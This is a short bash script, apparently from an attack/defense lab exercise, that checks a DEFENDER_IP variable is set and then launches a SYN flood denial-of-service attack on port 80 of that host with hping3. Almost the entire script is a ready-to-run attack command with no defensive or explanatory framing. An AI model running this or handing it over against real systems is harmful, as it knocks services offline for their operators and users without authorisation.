#!/bin/bash

# Check if DEFENDER_IP is set
if [ -z "$DEFENDER_IP" ]; then
  echo "DEFENDER_IP is not set"
  exit 1
else
  echo "DEFENDER_IP is set to $DEFENDER_IP"
fi

# Perform SYN flood attack
hping3 -S --flood -V -p 80 $DEFENDER_IP
